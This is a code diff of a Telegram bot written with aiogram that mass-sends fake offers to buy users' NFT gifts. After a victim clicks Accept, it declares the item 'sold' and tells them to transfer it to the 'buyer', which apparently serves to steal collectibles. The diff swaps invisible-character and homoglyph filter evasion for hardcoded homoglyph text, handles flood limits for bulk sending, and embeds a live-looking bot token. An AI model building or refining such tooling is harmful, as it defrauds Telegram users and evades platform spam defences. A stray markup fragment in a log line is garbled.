@@ -10,7 +10,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@monk"
+RECIPIENT = "@crypqtan"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -23,100 +23,44 @@ client_user_ids = {}
 
 LOCALES = {
     "ru": {
-        "offer_text": "предлагает вам",
-        "timer": "Предложение действует ещё",
-        "lock": "Сделка фиксируется кнопкой Принять",
-        "decline": "Отклонить",
-        "accept": "Принять",
-        "declined": "❌ Предложение отклонено.",
-        "success_title": "Коллекционный предмет",
-        "success_sold": "успешно продан!",
-        "instruction": "Передайте коллекционный предмет покупателю для зачисления",
-        "btn_transfer": "Передать НФТ",
+        "btn_decline": "Отклонить",
+        "btn_accept": "Принять",
+        "btn_transfer": "Передать",
         "btn_confirm": "Подтвердить передачу",
         "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
     },
     "eng": {
-        "offer_text": "offers you",
-        "timer": "Offer is valid for",
-        "lock": "The deal is fixed by clicking Accept",
-        "decline": "Decline",
-        "accept": "Accept",
-        "declined": "❌ Offer declined.",
-        "success_title": "Collectible item",
-        "success_sold": "successfully sold!",
-        "instruction": "Transfer the collectible item to the buyer to receive",
-        "btn_transfer": "Transfer NFT",
+        "btn_decline": "Decline",
+        "btn_accept": "Accept",
+        "btn_transfer": "Transfer",
         "btn_confirm": "Confirm transfer",
         "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
     },
     "ukr": {
-        "offer_text": "пропонує вам",
-        "timer": "Пропозиція діє ще",
-        "lock": "Угода фіксується кнопкою Прийняти",
-        "decline": "Відхилити",
-        "accept": "Прийняти",
-        "declined": "❌ Пропозицію відхилено.",
-        "success_title": "Колекційний предмет",
-        "success_sold": "успішно продано!",
-        "instruction": "Передайте колекційний предмет покупцю для зарахування",
-        "btn_transfer": "Передати НФТ",
+        "btn_decline": "Відхилити",
+        "btn_accept": "Прийняти",
+        "btn_transfer": "Передати",
         "btn_confirm": "Підтвердити передачу",
         "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
     },
     "cn": {
-        "offer_text": "向您出价",
-        "timer": "报价有效时间",
-        "lock": "点击接受以锁定交易",
-        "decline": "拒绝",
-        "accept": "接受",
-        "declined": "❌ 报价已拒绝。",
-        "success_title": "收藏品",
-        "success_sold": "已成功售出！",
-        "instruction": "请将收藏品转移给买家以获得",
-        "btn_transfer": "转移 NFT",
+        "btn_decline": "拒绝",
+        "btn_accept": "接受",
+        "btn_transfer": "转移",
         "btn_confirm": "确认转移",
         "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
     }
 }
 
-def randomize_text(text: str) -> str:
-    invisible_chars = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
-    chars = list(text)
-    for _ in range(random.randint(2, 4)):
-        pos = random.randint(0, len(chars))
-        chars.insert(pos, random.choice(invisible_chars))
-    return "".join(chars)
-
-def apply_homoglyphs(text: str) -> str:
-    homoglyph_map = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х'}
-    if random.random() > 0.5:
-        target_char = random.choice(list(homoglyph_map.keys()))
-        if target_char in text:
-            text = text.replace(target_char, homoglyph_map[target_char], 1)
-    return text
-
 def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
-    loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
+    # Премиум-эмодзи для оффера из твоего запроса
+    currency_emoji = f'<tg-emoji emoji-id="5258165702707125574">{currency_symbol}</tg-emoji>'
     
-    raw_desc = f'Пользователь {loc["offer_text"]} {amount} {currency_symbol} за данный предмет.'
-    raw_timer = f'{loc["timer"]} 5 ч. 59 мин.'
-    raw_lock = loc["lock"]
-
-    protected_desc = randomize_text(apply_homoglyphs(raw_desc))
-    protected_timer = randomize_text(raw_timer)
-    protected_lock = randomize_text(raw_lock)
-
-    icon_gift = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
-    icon_timer = '<tg-emoji emoji-id="5778527486270770928">⏱</tg-emoji>'
-    icon_lock = '<tg-emoji emoji-id="5875180111744995604">🔒</tg-emoji>'
-
     return (
-        f'{icon_gift} <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
-        f'{protected_desc}\n\n'
-        f'{icon_timer} <i>{protected_timer}</i>\n'
-        f'{icon_lock} <i>{protected_lock}</i>'
+        f'Пoльзοватeль cryptan пρeдлагaет Bам {amount} {currency_emoji} зa кoллeкционный пpедмeт '
+        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a>\n\n'
+        f'Пpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..'
     )
 
 def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
@@ -127,23 +71,20 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text=loc['decline'], callback_data=decline_data, icon_custom_emoji_id="5778527486270770928"),
-                InlineKeyboardButton(text=loc['accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
+                InlineKeyboardButton(text=loc['btn_decline'], callback_data=decline_data, icon_custom_emoji_id="5778527486270770928"),
+                InlineKeyboardButton(text=loc['btn_accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
             ]
         ]
     )
 
 def build_accept_text(gift_name, gift_num, currency_name, lang):
-    loc = LOCALES.get(lang, LOCALES["ru"])
     slug = gift_name.replace(" ", "")
-    
-    icon_success = '<tg-emoji emoji-id="5776375003280838798">🎁</tg-emoji>'
-    icon_info = '<tg-emoji emoji-id="5875180111744995604">ℹ️</tg-emoji>'
+    # Премиум-эмодзи для принятия из твоего запроса
+    success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
 
     return (
-        f'{icon_success} <b>{loc["success_title"]}:\n'
-        f'<a href="https://t.me/nft/{slug}-{gift_num}">{gift_name}-{gift_num}</a> {loc["success_sold"]}</b>\n\n'
-        f'{icon_info} {loc["instruction"]} {currency_name}.'
+        f'{success_emoji} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a> ycпeшo пpoдaн!\n\n'
+        f'• Пepeдaйтe пoкyпaтeлю для зачисления {currency_name}.'
     )
 
 def make_accept_keyboard(lang):
@@ -304,13 +245,14 @@ async def sender_worker():
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
-            logging.warning(f"Global flood control! Waiting {wait_time}s...")
+            logging.warning(f"Global flood control! Waiting {wait_time}s[span_0](start_span)[span_0](end_span).")
             await asyncio.sleep(wait_time)
             await message_queue.put(task)
 
         except Exception as e:
             error_str = str(e)
             if "PEER_FLOOD" in error_str:
+                logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
                 target_user_id = client_user_ids.get(task["chat_id"])
                 loc = LOCALES.get(task["lang"], LOCALES["ru"])
                 if target_user_id:
